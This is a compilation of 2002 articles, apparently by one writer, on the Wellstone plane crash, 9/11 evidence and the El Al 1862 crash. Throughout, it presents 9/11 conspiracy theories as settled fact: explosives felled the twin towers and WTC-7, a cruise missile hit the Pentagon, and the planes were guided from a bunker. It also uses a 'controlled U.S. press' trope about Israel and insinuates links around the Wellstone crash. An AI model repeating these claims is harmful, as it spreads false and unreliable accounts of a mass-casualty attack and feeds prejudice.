Earlier this year , FBI Agent Coleen Rowley accused officials at FBI headquarters of mishandling information developed in Minneapolis concerning 9 - 11 suspect Zacharias Moussaoui .
The FBI has since taken steps toward firing Turner .
Turner , a 24 - year veteran , has been on probation for much of the last year and was recently told during a job evaluation that her performance is " not acceptable . "
Grassley said the action " looks like retaliation against a whistle - blower who followed her conscience and exposed wrongdoing , even though it embarrassed the FBI .
If there are plans to fire her , the FBI is making a big mistake , and I want the people behind this retaliation held accountable . "
" PROGRESSIVE POPULIST "
Wellstone , described as " the most progressive populist in the Senate " had recently voted against giving President George W. Bush 's " flexibility " to attack Iraq .
Wellstone also opposed U.S. military action in Iraq in 1990 .
Wellstone was the only Democrat senator who was running for re-election to vote against the recent war resolution .
Wellstone 's opposition to the war had given him a boost in the polls .
The headline of the Minneapolis Star - Tribune on the Sunday before he died read : " Wellstone edges into lead in U.S. Senate race . "
The paper 's latest poll had found the two - term liberal Democratic senator to be leading by a 47 - 41 margin .
The White House had recruited former St. Paul mayor Norm Coleman to run against Wellstone .
" Republicans made ousting Wellstone a priority because of his vocal opposition to most of what George W. Bush stands for , " the Center for Voting and Democracy said in July .
The senate race in Minnesota was seen as crucial for the White House .
Bush 's political director Karl Rove is said to have personally selected Coleman to challenge Wellstone in the November 5 election .
Bush and Vice President Dick Cheney frequently visited Minnesota to support Coleman .
A mysterious Alexandria , Virginia - based outfit , calling itself Americans for Job Security ( AJS ) , with ties to big business and the Republican congressional leadership had spent more than $ 1 million on an anti-Wellstone ad campaign in Minnesota before the election .
AJS has a record of intervening in close political races around the country on behalf of conservative candidates .
The organization , headed by Michael Dubke , was founded with $ 1 million from the American Insurance Association .
In order to maintain the secrecy of its donors , AJS is registered as a " nonpolitical trade organization . "
Dubke said there is no contradiction between the group 's ads and its nonpolitical legal status .
He said AJS , which had advertised against Wellstone since June , had no desire to influence the outcome of the Minnesota race .
Asked by the Star - Tribune whether the anti-Wellstone commercials were " intended to influence the election , " Dubke replied , " Absolutely not . "
Fred Wertheimer , president of Democracy 21 , which advocates campaign finance changes , said it is " dead wrong to spend large amounts of money in elections and refuse to disclose where it 's coming from . "
MOUSSAOUI & THE CO - PILOT
The co-pilot who flew with Wellstone had known Zacharias Moussaoui , the accused Sept. 11 conspirator who had attended an Eagan ( Minn . ) flight school .
Co-pilot Michael Guess , 30 , had met the flying student Moussaoui at the Pan Am International Flight Academy where Guess worked last year .
Guess had reportedly " inadvertently " given Moussaoui unattended access to a computer program on flying a 747 jumbo jet .
An ex-manager of Pan Am told the FBI that Guess had placed a CD - ROM containing the 747 software at a workstation before one of Moussaoui 's training sessions .
After Moussaoui was arrested , the FBI searched his belongings and found the proprietary program copied on his laptop computer , the ex-manager said .
Guess had recently been laid off at the flight academy , where he had hoped to become a flight instructor .
" At Executive Aviation in Eden Prairie , where Guess had been employed as a pilot since June 2001 , a spokesman said colleagues remembered Guess telling them he had played a more significant role regarding the suspicions concerning Moussaoui , " the Star Tribune reported .
Dave Mona , a spokesman for Executive Aviation , said Guess ' colleagues had said HE had described himself as " at least a role player " in the detection of Moussaoui .
Mona said Guess had told his colleagues that " he and the receptionist . . . thought what [ Moussaoui ] was requesting was unusual " and had raised the issue with others .
9 -11 Evidence Hidden from Public
October 23 , 2002
The continuing secrecy surrounding the events of Sept.11 makes the work of independent investigators and publishers all the more essential to understanding what really happened .
" The most detailed analysis of how and why the World Trade Center collapsed could be forever kept from the public , " the Associated Press reported Sept. 30 .
The evidence being withheld includes " rare photos and videos " that have been " collected , " documentary evidence , maps of the debris piles , and three - dimensional computerized images of the fallen towers , according to the New York Times .
The evidence that is locked away , and may be permanently sealed , has been " gathered largely in secret " by experts who are forbidden by confidential agreements from discussing their findings , except with federal investigators , said Gerald McKelvey , a spokesman for Larry Silverstein , the leaseholder of the office space in the twin towers .
The Port Authority of New York and New Jersey , which owned the Trade Center complex , said in a statement that access to documents would be decided on a " case - by - case basis consistent with applicable law and policy . "
Silverstein obtained control of the World Trade Center property a mere six weeks before the terror attacks by securing the 99 - year lease with an initial payment of $ 100 million , most of which was reported to be borrowed funds .
Silverstein is currently seeking to win some $ 7 billion on his relatively minuscule investment by suing the insurance companies and claiming that the WTC attacks constituted " two separate occurrences , " rather than one .
The secret " expert analysis " is considered more authoritative than the investigation conducted by the Federal Emergency Management Agency , which " suffered from too few resources and a lack of access to critical information , " according to AP .
The secrecy surrounding Sept.11 has succeeded in keeping the American public in the dark about what truly caused the collapse of the twin towers , as well as the 47 - story WTC - 7 , built by Silverstein in 1987 .
WTC - 7 mysteriously collapsed in the late afternoon .
Serious questions also abound about what actually struck the Pentagon and why no evidence of a commercial jet was found at the site .
I have worked with a number of independent investigators to uncover the most important information about the attacks .
One American author , Eric Hufschmid , has written a book about 9 - 11 , Painful Questions :
An Analysis of the September 11th Attack , which presents compelling evidence that the attacks were " a scam of immense proportions . "
He says that explosives were used to take down the towers and WTC - 7 and that the Arab " terrorists " were mere patsies , like Lee Harvey Oswald in the assassination of President John Kennedy .
It is a well - written and illustrated book that contains rare photos of great importance , some of which are certain to be among those the government is trying to hide .
The high - quality large - format photos provide important evidence about what caused the collapses at the World Trade Center , WTC - 7 , and the Pentagon .
The book presents photographic evidence to support the theory that the twin towers of the World trade center were brought down using radio - controlled explosives .
He says the emergency command center , a hardened bunker on the 23rd floor of WTC - 7 , was the actual control center for the attack , and that the two airplanes that hit the towers appear to have been guided by a homing signal coming from the bunker .
WTC - 7 was a most unusual building .
While the hardened bunker on the 23rd floor had its own air and water supply , it had no accommodations for sleeping , which raises the obvious question about what kind of emergency it was designed for .
The WTC - 7 building was subsequently destroyed by controlled demolition that lasted 18 seconds according to seismic data , yet the actual collapse took less that 10 seconds in the late afternoon .
The other powerful blasts were to destroy the evidence from the hardened bunker , according to the author .
The remarkable photos in Painful Questions show the top 30 floors of the South Tower tipping and falling in one piece , yet solid pieces of this section never hit the ground .
How can it be , Painful Questions asks , that the towers collapsed floor - by - floor as quickly as free - falling debris fell through the open air ?
The video and seismic evidence show that the towers collapsed in 8 to 10 seconds , which is how long a falling object dropped from the top of the tower would take to hit the ground .
The resistance of the undamaged base of the tower would have significantly slowed the collapse of the towers .
For 110 floors to shatter in about nine seconds , each floor would have shattered in the blink of an eye .
he says , " There should have been a thump , thump , thump and the collapsing rubble impacted the floor below , but the video shows that the floors did not encounter any resistance as they fell . "
Painful Questions explains how explosives could accomplish this trick .
Photos of debris being spewed horizontally hundreds of feet raise further questions about whether it was precision - timed explosions or " compression " which caused the towers to disintegrate , sending pulverized concrete and bits of steel flying over lower Manhattan .
John Iannarelli of the FBI 's national press office told me the bureau has " no evidence " of explosions at the WTC and that " compression " pulverized the concrete and sent steel beams flying horizontally for hundreds of feet .
Others say this is evidence that explosives were used .
While the Pentagon attack has been largely obscured by the collapses at the World Trade center , there are as many unanswered questions about what actually happened at the Pentagon .
In October , two books about 9/11 by French author Thierry Meyssan arrived in the United States .
Meyssan focused on the Pentagon attack on his books , which have been translated from French , 9 - 11 : the Big Lie and Pentagate .
The publisher , Patrick Pasin , said the television show " 60 Minutes " was coming to France to interview Meyssan and that the author is now willing to travel the United states to discuss his work .
Meyssan presents photographic evidence that challenges the claim that a large passenger jet struck the Pentagon .
He posits that an air - launched cruise missile , painted to look like a commercial jet , struck the Pentagon .
I have repeatedly asked the Pentagon , American Airlines , and the FBI for basic information about the 9 - 11 attack , in particular about the unexplained pieces of debris , assumed to be a piece of an American Airlines jet , that was photographed on the Pentagon lawn .
After numerous requests for clarification about the status of the large piece of debris , Lt. Col .
David Lapan , spokesman for the Department of defense , finally said , " It 's not a Pentagon issue . "
As American Airlines routinely forwards all 9 - 11 information requests to the FBI , I turned to FBI headquarters in Washington .
The FBI 's Iannarelli said : " It is no secret that an airplane hit the Pentagon . "
However , the object that bored a smooth seven - foot round hole through six - reinforced concrete walls in the three rings of the Pentagon left no traces of itself behind .
" The plane that struck the Pentagon was pulverized , " Iannarelli said .
" Never was any large piece of anything recovered at the Pentagon crash site , " he said .
Asked whether the dense steel landing gear , which had carried right on through the WTC twin towers and landed blocks away , had been found at the Pentagon , Iannarelli said , " nothing that was recognizable " as coming from an airplane was found .
There are no clear seismic signals , which can be associated with the crash of a 100 - ton airplane into the Pentagon , according to seismologists .
I asked Maryland - based seismologist Gerald Baum about the lack of seismic evidence from the Pentagon crash .
If a large jet aircraft traveling 400 miles per hour struck the Pentagon , why did it not result in any recorded seismic shock waves ?
Baum said that that although the seismometers near the Pentagon are " state - of - the - art , " the fact that the Pentagon was built on swampland on a base that is " all fill " means the impact is less likely to have resulted in seismic shock waves because the building " is not anchored to the bedrock . "
Readers of Gen. Ben Partin 's investigation of the bombing of the Murrah Federal Building in Oklahoma city have concluded that Tim McVeigh was a patsy .
Hufschmid says he " soon realized what AFP readers have known for long time ; namely , that a lot of critical information is being hidden by our corrupt media and government . "
El Al Crash Exposes Israel 's Chemical Weapons Arsenal
October 9 , 2002
Israel 's huge arsenal of weapons of mass destruction — not Iraq 's — poses the most serious threat to peace in the Middle East and endangers global health .
While the controlled U.S. press remains fixated on Iraq 's alleged weapons of mass destruction , it ignores the grave danger of the more sophisticated and lethal arsenal of weapons of mass destruction being developed and stored in Israel — with the support of the U.S .
Ten years ago , on Oct. 4 , 1992 , an Israeli cargo jet carrying three of the four components of the nerve gas Sarin , as well as other hazardous materials , crashed into an apartment building in Holland .
The known facts of the crash of El Al Flight 1862 , the worst air disaster in Dutch history , reveal that Holland 's government engaged in a " huge cover - up " and lied to its citizens to help conceal Israel 's unlawful chemical weapons arsenal and the international network that supports it .
The Israeli cargo plane , a Boeing 747-200 F , with three crewmen , one non-paying passenger and 114 tons of freight , left Amsterdam 's Schiphol airport at 6:21 p.m. en route to Tel Aviv .
Seven minutes later , both starboard engines ripped loose from the wing .
The pilot circled back to attempt an emergency landing and crashed into a high - rise apartment complex in Bijlmer , 10 miles east of Schiphol .
While only four people died on the plane , the crash of El Al Flight 1862 became the worst air disaster in Dutch history because it killed scores of people on the ground and destroyed the health of thousands of others by exposing them to the toxic chemicals on the plane .
The exact number of dead is still not known .
In the immediate aftermath of the crash , Dutch government officials lied to the public saying the plane was only transporting flowers and perfume .
It took six years before the Dutch newspaper NRC Handelsblad revealed the true contents of the crashed plane and their destination .
" The cargo documents show that the aircraft carried dimethyl methylphosphonate ( DMMP ) and two other substances needed to make the deadly nerve gas Sarin .
The DMPP was destined for the Israeli Institute for Biological Research ( IIBR ) , " the paper reported in October 1998 .
Mouin Rabbani , writing in Middle East International , describes the IIBR , located at Nes Zion near Tel Aviv , as " the Israeli military and intelligence community 's front organization for the development , testing and production of chemical and biological weapons . "
I interviewed Pierre Heijboer , a senior editor with the Dutch Volkskrant newspaper , who lives a mile from Bijlmer and was one of the first reporters on the scene .
" I was in Biafra and Vietnam , but I never saw anything like that crash .
It was like looking into a steel smelter , " Heijboer said .
" The concrete of the flats was glowing red . "
Heijboer despises the cover - up : " I just get angry that they lied .
It was n't that the Israelis were flying cargoes of ugly stuff above my head .
What angers me is that my government lies to its citizens . "
Tapes of phone conversations between El Al and Schiphol Air Traffic Control ( SATC ) reveal collusion to conceal the plane 's contents .
In one tape , recorded minutes after the crash and hidden in a safe for more than six years , an El Al employee tells an SATC employee : " There is poison on board : ammunition and flammable liquids . "
The SATC official responded : " We will keep these things under the lid . "
Dutch authorities sent workers to clean up the contaminated area without the benefit of protective clothing .
Even Holland 's Queen Beatrix , despite being a long - time Bilderberg participant , was not informed of the danger when she made a visit to the crash site the next day .
" For the government and authorities of the Netherlands the safety of its own citizens is less important than the security of El Al military cargo planes , " Heijboer said .
Heijboer 's new exposé on the crash , Doomed Flight , was released Sept. 21 , and quickly became a best seller .
Heijboer says 30 eyewitnesses saw Israeli agents in white chemical outfits at the crash scene , sifting through the debris and removing critical evidence .
A 1998 Dutch police report says officers on the scene recognized the men in white suits who absconded with evidence as Israeli agents .
" As they came near , I thought I recognized them .
They looked just like the young men from the Israeli security service who regularly practice shooting at our police school , " one officer said .
" I 've often said to people : ' Mossad was there first . ' "
Another officer said : " We started to unroll a red and white ribbon to seal off the area .
The 10 men ignored this and , when I managed to grab one by his arm , he said , ' We 're from El Al . '
Oh well , must be okay then I thought .
They must have been in radio contact with the crew .
How else could they have gotten here so fast ? "
A fireman , Carel Boer , said : " We had to stand aside while people in astronaut - like suits carried away a kind of box .
I could n't see what it was since it was covered with a blanket . "
The plane 's " black box " flight recorder was never recovered , and El Al refused to reveal the cargo manifest .
An estimated 3,000 Dutch residents suffer health problems as a result of the chemical and radioactive poisoning that occurred when El Al 1862 crashed .
Today there is growing awareness in Holland of Israel 's privileged and unregulated use of Amsterdam 's Schiphol Airport to transport dangerous military cargo , a practice that clearly puts the health of the Dutch people at risk .
" El Al has its own security force at Schiphol , " Heijboer said .
" But they do n't work for El Al -- they are all from Shin Bet ( Israeli secret service ) and are paid by the Israeli embassy .
The Israelis run the airport like a little Haifa . "
Dutch Attorney General Vrakking testified on Jan. 29 , 1999 , that the El Al security detachment at Schiphol was a branch of Mossad .
" Schiphol has become a hub for secret weapons transfers , " charged Henk van der Belt , an investigator working with the Bijlmer survivors .
" Dutch authorities have no jurisdiction over Israeli activities at the airport . "
A TV Amsterdam ( TVA ) report identified Schiphol as one of several European airports that allows El Al to transfer cargo without supervision .
TVA said Belgian politicians now fear that " a disaster like the crash in Holland in 1992 is possible at [ Belgium 's ] Zaaventem .
This airport is , like Schiphol , under control by the secret police of Israel . "
The Dutch press reported that security officials had been waiving Israeli air cargo through Schiphol , El Al 's European hub , since the 1950s .
" Of course it continues , " Heijboer said .
" There are rules , but there is an exception — El Al is allowed to ignore the rules . "
A Dutch Air Guidance Organization employee told a parliamentary hearing that " policy " since 1973 was to keep quiet about all El Al activities .
Schiphol workers testified that customs or the Dutch Flight Safety Board never inspected El Al planes .
A parliamentary committee discovered that every Sunday evening a mysterious El Al cargo flight routinely touched down at Schiphol en route from New York to Tel Aviv .
These flights did not appear on airport arrival monitors , the cargo was never checked , and the documentation for the flights was processed in a special , unmarked room .
Shipping precursors of chemical weapons , such as those aboard 1862 , is a violation of the Chemical Weapons Convention ( CWC ) , which the U.S. is party to .
Solkatronic Chemicals of Morrisville , Pa. , had sold the DMMP .
The chemical is a Schedule 2 precursor for Sarin under the CWC and its export is strictly controlled by the U.S. government .
In spite of this , the Department of Commerce repeatedly granted Solkatronic a license to ship DMMP to IIBR .
Spokesmen at the Dept. of Commerce were unable to say whether such shipments would continue .
I asked the Organization for the Prohibition of Chemical Weapons ( OPCW ) in the Hague about Israel 's use of Schiphol to transport components for chemical weapons .
Peter Kaiser , spokesman for OPCW , was not familiar with the details of flight 1862 but said that Israel , as a non-member , which has signed but not ratified the treaty , was obliged to " respect the convention . "
Israel has never admitted producing chemical or biological weapons and , because it is not a member state of the CWC , is not required to divulge what chemical weapons it has or accept inspectors .
However , a member state , such as the United States , is proscribed from providing a non-member state like Israel chemical weapons or precursor chemicals such as DMMP .
The Israeli government was finally compelled to admit that the jet had been carrying 190 liters of DMPP , a crucial component of Sarin .
Sarin , 20 times as lethal as cyanide , kills by crippling the nervous system and was used in a terror attack on the Tokyo underground system that killed six passengers and injured more than 3,000 .
In 1992 , any revelation that the U.S. was supplying Israel with the components to make chemical weapons was played down , because alleged Iraqi development of chemical weapons has been used for propaganda purposes to justify U.S. aggression against Iraq .
Jan Medema , a chemical weapons inspector from the toxic substances division at the Dutch Defense Research Institute in The Hague , said the quantity of Sarin components on the plane was sufficient to generate more than a quarter of a ton of the deadly nerve gas .
Heijboer said this was the third known shipment of these chemicals to the IIBR .
The fact that the IIBR was the destination of the cargo indicates to Medema that this shipment was to create a large amount of Sarin .
" We have been trying to think what possible research purposes you would need this compound in such large quantities for , " Medema said .
" The likelihood has to be that it was for Sarin .
Either they had some special plan for an experiment or they needed a quantity of Sarin for some special purpose .
This raises many questions . "
Uzi Mahnaimi of the Times said that Israeli assault aircraft crews had been trained to fit an " active chemical or biological weapon within minutes of receiving the command to attack .
The weapons are manufactured at the Institute for Biological Research in a suburb of Nes Zion . "
The Big Lie Banned in America
September 7 , 2002
The books by the French author Thierry Meyssan , which " challenge the official version of the Sept. 11 attacks , " have been best - sellers in Europe .
Their reception may be different in the United States , however , where they have been banned for being " anti-American . "
Meyssan 's two best - selling books , 9/11 – The Big Lie and Pentagate , refute " the entire official version of the Sept. 11 attacks , " and will soon be available in the United States .
The books have been extremely successful in Europe , selling more than 200,000 copies in France , but strong resistance and censorship suggest a different fate may await them in America .
I spoke with Patrick Pasin , the French publisher , who said that 70,000 copies have been printed and shipped to the United States .
The books should be available by the end of September , he said .
The on - line book store Amazon.com is already offering the books promising delivery in " three to five weeks " .
Meyssan 's books claim that a military faction in the U.S. government used remote control to guide two aircraft into the twin towers and that a U.S. cruise missile - not an American Airlines jet - smashed into the Pentagon .
While thousands of articles about Meyssan 's theories can be found on the Internet , only 2 articles have appeared in the U.S. mainstream media , and these have avoided engaging the substance of his arguments .
The cover of 9/11 – The Big Lie says the book " is based exclusively on documents published by the White House and the U.S. Dept. of Defense , as well as statements by American civilian and military leaders to the international press . "
Pasin , the founder and director of the Carnot publishing house , said that while the books should be available to American readers by the end of September , many bookstores have said they will not carry the books because they are " anti-American . "
Even Amazon.com , the on - line book dealer , was criticized in the U.S. media with an article , " Amazon to sell anti-U.S. 911 book , " Pasin said .
While one of the English translations was ready in April , Pasin said he held off on releasing the books in America until after the anniversary of Sept. 11 because he " considered it was too early . "
" We had to wait some time , " Pasin said .
" We do n't want to provoke people .
There is a lot of pain in many families - I share their pain . "
Meyssan 's controversial theories first appeared in March in a website in which he presented the video footage from a security camera at the Pentagon which shows an unidentified object striking the Pentagon and exploding in a white hot flash .
Meyssan 's site suggests that this object is a cruise missile , precisely as one eyewitness described it : " a cruise missile with wings " , and challenges the viewers to examine the photos to " Find the Boeing . "
The photos from the security camera are problematic because the object appears to be much smaller than the Boeing and the white hot flash seems to be more indicative of the impact of an explosive warhead - rather than a civilian aircraft - according to independent investigators .
" DISGUSTING " BOOKS
Pentagon spokesperson , Victoria Clarke , called Meyssan 's books " disgusting . "
" There is no question , " Clarke said , " there is no doubt what happened that day .
And I think it 's appalling that anyone might try to put out that kind of myth .
I think it 's also appalling for anyone to continue to give those sorts of people any kind of publicity . "
FACTS , the largest Swiss - German news magazine , recently featured Meyssan 's arguments and evidence in a cover story titled , " The Evil sits in the Pentagon . "
While a spokesman for FACTS said the article was " quite critical " of Meyssan 's theories , the way in which the photographs and text are presented must raise serious questions in the mind of the reader .
I contacted Lt. Col. David Lapan at the Pentagon to ask about the photographs found in the FACTS article .
Lapan said that the photos came from a Pentagon security camera video which CNN had " unofficially obtained . "
The photos had been " snuck out " of the Dept. of Defense and " leaked " to CNN , Lapan said .
When asked to comment on the images , Lapan balked and requested that the photos be sent by e-mail .
I promptly sent the images , easily obtained from the websites of CNN and other news networks , with relevant questions about what can be discerned from the images , their origin , and whether CNN had been reprimanded for divulging information that had been " unofficially obtained " from the Dept. of Defense .
" DoD did not release the security camera video , " Lapan said , " contrary to what CNN claimed in their story .
Video images related to the terrorist attack on the Pentagon had been turned over to law enforcement agencies as part of their investigation , he said , but the Pentagon is " not engaged in trying to determine who leaked the video / photos , nor has there been a reprimand . "
While the events at the World Trade Center received greater attention than the crash in Washington , Meyssan focuses on attack on the Pentagon .
While the official explanation is that the hijacked American Airlines Flight 77 with its 64 passengers flew into the Pentagon , Meyssan says the object was a military cruise missile .
The white - hot blast seen in the photographs , he says , indicates that the object striking the Pentagon resulted in a " detonation " of a high - explosive , rather than the less intense " deflagration " one would expect to see from a kerosene - laden jetliner striking the wall of a building .
Dorothea
Hahn , the author of the article in FACTS , said that Meyssan " asks the right questions " but added that he is " very categorical " and selective about the information that he presents in order " to prove his theory . "
Although more than 200,000 copies of his book have been sold in France , the French media is " extremely critical of him , " Hahn said .
" If Meyssan 's theory is true , there must be hundreds of people involved in the conspiracy , " Hahn said .
" They would have started to talk by know . "
Hahn added that Flight 77 must have been destroyed somewhere else if it did n't crash into the Pentagon .
" WE NEED TO KNOW "
" We need to know what really happened , " Hahn said .
" What has been explained by the officials has too many contradictions and irregularities .
Without a proper investigation , these conspiracy theories flourish . "
" What I hope is that there will be a debate on what really happened and that opinion in the United States and the rest of the world is alerted , " Meyssan said .
" The U.S. government has chosen its scapegoats … But we cannot allow those who are really guilty to go unpunished and the innocent to be bombed . "
Pasin wrote in a recent letter to Amazon , " As the publisher , from the beginning I had in mind all these innocent victims .
For their memory , we must know ; we cannot accept that the culprits remain unpunished , whoever they are .
The books of Mr. Meyssan are our contribution , and I can assure you that I never felt anti-U.S. at all .
On the contrary : we need a strong democracy in the United States of America . "
The Seismic Evidence & Molten Iron in the Rubble
August 27 , 2002
Two unexplained " spikes " in the seismic record from 9 - 11 indicate huge bursts of energy shook the ground beneath the World Trade Center 's twin towers immediately prior to the collapse .
I have learned of pools of " molten steel " found at the base of the collapsed twin towers weeks after the collapse .
Although the energy source for these incredibly hot areas has yet to be explained , New York seismometers recorded huge bursts of energy , which caused unexplained seismic " spikes " at the beginning of each collapse .
These spikes suggest that massive underground explosions may have literally knocked the towers off their foundations , causing them to collapse .
In the basements of the collapsed towers , where the 47 central support columns connected with the bedrock , hot spots of " literally molten steel " were discovered more than a month after the collapse .
Such persistent and intense residual heat , 70 feet below the surface , in an oxygen starved environment , could explain how these crucial structural supports failed .
Peter Tully , president of Tully Construction of Flushing , N.Y. , told me that he saw pools of " literally molten steel " at the World Trade Center .
Tully was contracted after 9 - 11 to remove the debris from the site .
Tully called Mark Loizeaux , president of Controlled Demolition , Inc. ( CDI ) of Phoenix , Md. , for consultation about removing the debris .
CDI calls itself " the innovator and global leader in the controlled demolition and implosion of structures . "
Loizeaux , who cleaned up the bombed Alfred P. Murrah Federal Building in Oklahoma City , arrived at the WTC site two days later and wrote the clean - up plan for the entire operation .
I asked Loizeaux about the report of molten steel on the site .
" Yes , " he said , " hot spots of molten steel in the basements . "
These incredibly hot areas were found " at the bottoms of the elevator shafts of the main towers , down seven [ basement ] levels , " Loizeaux said .
The molten steel was found " three , four , and five weeks later , when the rubble was being removed , " Loizeaux said .
He said molten steel was also found at WTC 7 , which collapsed mysteriously in the late afternoon .
Construction steel has an extremely high melting point of about 2,800 degrees Fahrenheit .
Asked what could have caused such extreme heat , Tully said , " Think of the jet fuel . "
Loizeaux said the steel - melting fires were fueled by " paper , carpet and other combustibles packed down the elevator shafts by the tower floors as they ' pancaked ' into the basement . "
However , some independent investigators dispute this claim , saying kerosene - based jet fuel , paper , or the other combustibles normally found in the towers , cannot generate the heat required to melt steel , especially in an oxygen - poor environment like a deep basement .
Due to the lack of oxygen , paper and other combustibles packed down at the bottom of elevator shafts would probably be a smoky smoldering pile .
Experts disagree that jet - fuel or paper could generate such heat .
This is impossible , they say , because the maximum temperature that can be reached by hydrocarbons like jet - fuel burning in air is 1,520 degrees F. Because the WTC fires were fuel rich , as evidenced by the thick black smoke , it is argued that they did not reach this upper limit .
The hottest spots at the surface of the rubble , where abundant oxygen was available , were much cooler than the molten steel found in the basements .
Five days after the collapse , on Sept. 16 , the National Aeronautics and Space Administration ( NASA ) used an Airborne Visible / Infrared Imaging Spectrometer ( AVIRIS ) to locate and measure the site 's hot spots .
Dozens of hot spots were mapped , the hottest being in the east corner of the South Tower where a temperature of 1,377 degrees F. was recorded .
This is , however , less than half as hot at the molten steel in the basement .
The foundations of the twin towers were 70 feet deep .
At that level , 47 huge box columns , connected to the bedrock , supported the entire gravity load of the structures .
The steel walls of these lower box columns were four inches thick .
Videos of the North Tower collapse show its communication mast falling first , indicating that the central support columns must have failed at the very beginning of the collapse .
" Everything went simultaneously , " Loizeaux said .
" At 10:29 the entire top section of the North Tower had been severed from the base and began falling down , " he writes .
" If the first event was the falling of a floor , how did that progress to the severing of hundreds of columns ? "
Asked if the vertical support columns gave way before the connections between the floors and the columns , Ron Hamburger , a structural engineer with the FEMA assessment team said , " That 's the $ 64,000 question . "
Loizeaux said , " If I were to bring the towers down , I would put explosives in the basement to get the weight of the building to help collapse the structure . "
SEISMIC 'SPIKES '
Seismographs at Columbia University 's Lamont - Doherty Earth Observatory in Palisades , N.Y. , 21 miles north of the WTC , recorded strange seismic activity on Sept. 11 that has still not been explained .
While the aircraft crashes caused minimal earth shaking , significant earthquakes with unusual spikes occurred at the beginning of each collapse .
The Palisades seismic data recorded a 2.1 magnitude earthquake during the 10 - second collapse of the South Tower at 9:59:04 and a 2.3 quake during the 8 - second collapse of the North Tower at 10:28:31 .
However , the Palisades seismic record shows that — as the collapses began — a huge seismic " spike " marked the moment the greatest energy went into the ground .
The strongest jolts were all registered at the beginning of the collapses , well before the falling debris struck the Earth .
These unexplained " spikes " in the seismic data lend credence to the theory that massive explosions at the base of the towers caused the collapses .
A " sharp spike of short duration " is how seismologist Thorne Lay of University of California at Santa Cruz said an underground nuclear explosion appears on a seismograph .
The two unexplained spikes are more than 20 times the amplitude of the other seismic waves associated with the collapses and occurred in the East - West seismic recording as the buildings began to fall .
Experts cannot explain why the seismic waves peaked before the towers actually hit the ground .
Asked about these spikes , seismologist Arthur Lerner - Lam , director of Columbia University 's Center for Hazards and Risk Research said , " This is an element of current research and discussion .
It is still being investigated . "
Lerner - Lam said that a 10 - fold increase in wave amplitude indicates a 100 - fold increase in energy released .
These " short - period surface waves , " reflect " the interaction between the ground and the building foundation , " according to a report from Columbia Earth Institute .
" The seismic effects of the collapses are comparable to the explosions at a gasoline tank farm near Newark on Jan. 7 , 1983 , " the Palisades Seismology Group reported on Sept. 14 , 2001 .
One of the seismologists , Won -Young Kim , told me that the Palisades seismographs register daily underground explosions from a quarry 20 miles away .
These blasts are caused by 80,000 pounds of ammonium nitrate and cause local earthquakes between Magnitude 1 and 2 .
Kim said the 1993 truck - bomb at the WTC did not register on the seismographs because it was " not coupled " to the ground .
" Only a small fraction of the energy from the collapsing towers was converted into ground motion , " Lerner - Lam said .
" The ground shaking that resulted from the collapse of the towers was extremely small . "
Last November , Lerner - Lam said : " During the collapse , most of the energy of the falling debris was absorbed by the towers and the neighboring structures , converting them into rubble and dust or causing other damage — but not causing significant ground shaking . "
Evidently , the energy source that shook the ground beneath the towers was many times more powerful than the total potential energy released by the falling mass of the towers .
The question is :
What was that energy source ?
While steel is often tested for evidence of explosions , despite numerous eyewitness reports of explosions in the towers , the engineers involved in the FEMA - sponsored building assessment did no such tests .
Dr. W. Gene Corley , who investigated for the government the cause of the fire at the Branch Davidian compound in Waco and the Oklahoma City bombing , headed the FEMA - sponsored engineering assessment of the WTC collapse .
Corley told me that while some tests had been done on the 80 pieces of steel saved from the site , he said he did not know about tests that show if an explosion had affected the steel .
" I am not a metallurgist , " Corley said .
Much of the structural steel from the WTC was sold to Alan D. Ratner of Metal Management of Newark , N.J. , and the New York - based company Hugo Neu Schnitzer East .
Ratner , who heads the New Jersey branch of the Chicago - based company , sold the WTC steel to overseas companies , reportedly selling more than 50,000 tons of steel to a Shanghai steel company known as Baosteel for $ 120 per ton .
Ratner paid about $ 70 per ton for the steel .
Other shipments of steel from the WTC went to India and other Asian ports .
Ratner came to Metal Management after spending years with a metal trading firm known as SimsMetal based out of Sydney , Australia .
Open Letter to 9 - 11 Investigators
August 24 , 2002
The evidence is now compelling — the twin towers were blown off their feet .
The plane crashes and fires were but secondary distractions to the main event .
The towers were literally " blasted " off their footings at the beginning , and during the first phase , of their respective collapses .
The fact that the towers were seen " jumping " immediately before the collapse is documented on film by a helicopter camera that witnessed that event .
Massive explosions deep in the basements of the WTC towers clearly lifted — and dropped — the massive structures from their bases 70 feet below the surface .
The basement explosions that detached the central support columns from the bedrock , and dropped the towers , left extremely hot pools of molten steel ( 1535 + degrees Celsius ) , which persisted for days in the lowest basements ( - 7 level ) , and clear seismic tracks — that have yet to be explained .
However , the seismic evidence is quite clear :
There were massive ( and unexplained ) releases of energy causing 2.1 and 2.3 magnitude earthquakes before any debris even hit the ground .
Furthermore , seismologists agree that the falling rubble would only cause minimal seismic disturbances , which is what the seismic record clearly shows it did ( e.g. , Columbia University 's Arthur Lerner - Lam's reports ) .
As a matter of fact , the impact of the " rubble " ( we can no longer speak of large pieces ) caused only relatively minor seismic shock wave signatures compared to what rocked the Earth ( 2.1 and 2.3 earthquakes ) at the towers ' base from the beginning of the collapse until about 5 seconds into the 8 - and 10 - second collapses .
The massive seismic wave " spike " , which occurred at about 4 - 5 seconds into the 8 - second collapse of the North Tower was many times larger than the waves that marked the moment of impact when the " rubble " finally hit the ground .
DROP THE COVER-UP
Investigators :
The cat is out of the bag .
The game is up .
The evidence is now overwhelming and compelling .
Scientists who continue to obfuscate and refuse to investigate the clear evidence of explosions in the towers will undoubtedly be considered by honest investigators , the public , and history to be part of the cover - up .
The steel evidence must be tested for signs of " twinning " , the tracks left in steel of exposure to high - energy explosions .
All steel from the basements must be tested for such twinning as well as for radioactivity .
I , for one , would not want to be in the position of being involved in the criminal cover - up of this horrendous mass murder .
Those investigators who participate in the cover - up , whether actively or passively , whether by action or inaction , should expect to find themselves branded as quislings , of both their nation and their science .
The only sure path is to pursue the truth , wherever it may lead .
Foreign Firms Destroyed Crucial Evidence
August 14 , 2002
Why did a foreign company - headed by a knight of the British Empire - manage the controversial " clean - up " of the rubble at the World Trade center and the Pentagon ?
Although the terror attacks of 9 - 11 were clearly criminal acts of mass murder , no effort was made to preserve the integrity of the crime scenes and the essential evidence was disposed of like garbage .
The editor - in - chief of Fire Engineering magazine , William A. Manning , issued an urgent " call to action " to America 's firefighters at the end of 2001 , calling for a forensic investigation and demanding that the steel from the site be preserved to allow investigators to determine what caused the collapse .
